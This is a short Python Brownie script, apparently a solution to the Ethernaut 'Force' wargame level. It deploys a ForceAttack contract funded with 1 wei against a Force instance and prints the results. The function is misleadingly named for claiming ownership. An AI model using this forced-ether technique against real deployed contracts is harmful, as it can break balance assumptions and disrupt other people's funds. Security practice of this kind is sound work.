from brownie import Force, ForceAttack
from scripts.helpers import LOCAL_BLOCKCHAIN_ENVIRONMENTS, get_account, get_instance_address


def claim_ownership_of_force_contract():
    # init
    hacking_account = get_account()
    contract_to_be_hacked_address = get_instance_address(instance_name="force_instance", contract_to_deploy=Force)
    # hack
    deploy_attack = ForceAttack.deploy(contract_to_be_hacked_address, {"from": hacking_account, "value": 1})
    # check results
    print(deploy_attack.info())
    print(deploy_attack.contract_address())
    

def main():
    claim_ownership_of_force_contract() 